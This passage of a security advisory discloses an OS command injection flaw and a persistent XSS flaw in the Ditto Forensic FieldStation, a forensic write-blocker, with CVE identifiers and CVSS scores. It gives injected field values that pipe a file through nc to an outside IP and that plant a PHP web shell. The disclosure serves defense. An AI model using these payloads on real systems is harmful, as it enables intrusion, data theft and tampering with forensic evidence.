Therefore IT forensic experts use write-blockers to  ， ensure a read-only access to evidence data like hard disks or USB mass  ， storage.  ， The Ditto Forensic FieldStation is such a special equipment (hardware with  ， embedded software) used by forensic experts to analyse and copy evidence data  ， in a safe and secure way. The ditto is explicitly marketed as a device to  ， acquire data from network file shares, too. This means it is meant to be  ， connected to possibly hostile networks of suspects.  ， However it was found to be vulnerable up to the point of not being reliable as  ， a computer forensic device.  ， 1] = OS Command Injection =  ， Class: Command Injection [CWE-77]  ， Impact: Code execution  ， Remotely Exploitable: Yes  ， CVE Name: CVE-2013-6881  ， CVSS v2 Base Score: 10  ， Overall CVSS v2 Score: 9.2  ， CVSS v2 Vector:  ， (AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)  ， Several input fields of the web application are vulnerable to OS command  ， injection. E.g. the application allows the setting of parameters like 'sector  ， size' or 'skip count' for a forensic imaging task. Because of improper  ， neutralization in combination with the web server running with root  ， privileges, an attacker is able to access and manipulate the complete system.  ， Example 1 (setting of 'sector size' = 1 with malicious content):  ， 1;cat /opt/web/htdocs/index.php | nc 192.168.1.1 6666;  ， Example 2 (setting of 'set-size' = 1 with copying a PHP shell from  ， the external SD card):  ， 1;cp /ditto/shell.php /opt/web/htdocs;  ， 2] = Persistent XSS =  ， Class: Cross-site Scripting [CWE-79]  ， Impact: Code execution  ， Remotely Exploitable: Yes  ， Status: unpatched  ， CVE Name: CVE-2013-6882  ， CVSS v2 Base Score: 9  ， Overall CVSS v2 Score (if patched): 9.2  ， CVSS v2 Vector:  ， (AV:N/AC:L/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)  ， Overall CVSS v2 Score (unpatched): 10  ， The web application suffers from multiple vulnerabilities regarding XSS. The  ， first one (a) is critical because an unauthorized attacker is able to push  ， malicious code into the system and consequently attacking every user. The  ， other ones (b) need authentication first.  ， a) The web application logs every login (including the username) in a not  ， sanitized way to a system log. Additionally, the web application embeds that  ， system log rendered as HTML into the start page of every user who successfully  ， logs in. Thus an unprivileged attacker can persistently inject malicious code  ， which attacks all users of the vulnerable system immediately after their  ， login."
